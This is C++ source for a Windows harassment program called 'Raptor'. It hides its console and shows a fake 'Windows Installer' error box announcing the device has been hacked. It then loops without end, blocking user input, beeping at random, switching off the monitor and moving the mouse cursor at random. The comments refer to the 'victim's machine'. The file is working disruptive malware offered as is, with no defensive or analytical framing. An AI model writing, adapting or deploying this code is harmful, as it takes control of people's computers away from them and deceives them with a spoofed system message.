#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <winable.h>
#include <conio.h>
#include <ctime>

using namespace std;

int random, Freq, Dur, X, Y;
HWND mywindow, TaskMgr, CMD, Regedit;

void Run(int ID);
void Beeper(), Hibernation(), CrazyMouse();

void hidewindow(){
    //Hide Console 
	HWND stealth;	
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0); //0 coz hiding this one and showing another window
}

int main(){
    hidewindow();
    srand(time(0));
    random = rand()%6;
	MessageBox(NULL, TEXT("Hi, This is Raptor!! \nYour Device Has Been Hacked!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);  //Shows a message on victim's machine

    BlockInput(true);
    Sleep(20);
    BlockInput(false);

    while(1){   //Defines number of time the main task is performed 
        Run(random);
        Sleep(10);
        BlockInput(false);
    }
}

void Run( int ID ){
    if(ID == 1)
        BlockInput(true);

    else if(ID == 2)
        Beeper();
    
    else if(ID == 3)    
        Hibernation();
    
    else if(ID == 4)
        CrazyMouse();
    
    else{
        BlockInput(true);
        Beeper();
        CrazyMouse();
    }
}

void Beeper(){      //Random beep sound from machine
    Freq = rand()%2001;
    Dur = rand()%301;
    Beep( Freq, Dur );
}

void Hibernation(){     //Turn off the monitor

    Sleep(1000);
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
}

void CrazyMouse(){      //making your mouse go crazy. Make two rand var's and tell the mouse to goto them
    X = rand()%801;
    Y = rand()%601;
    SetCursorPos( X, Y );
}
